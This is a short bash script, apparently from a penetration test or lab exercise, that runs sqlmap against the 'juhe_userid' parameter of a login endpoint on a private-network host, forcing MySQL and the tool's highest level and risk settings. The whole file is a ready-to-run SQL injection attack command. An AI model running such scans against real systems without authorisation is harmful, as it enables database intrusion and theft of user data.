#!/bin/env bash

sqlmap -u "http://192.168.66.136:9001/player/getLoginMemory?juhe_userid=fj1003" \
		-pjuhe_userid \
		--dbms=mysql \
		--level=5 \
		--risk=3


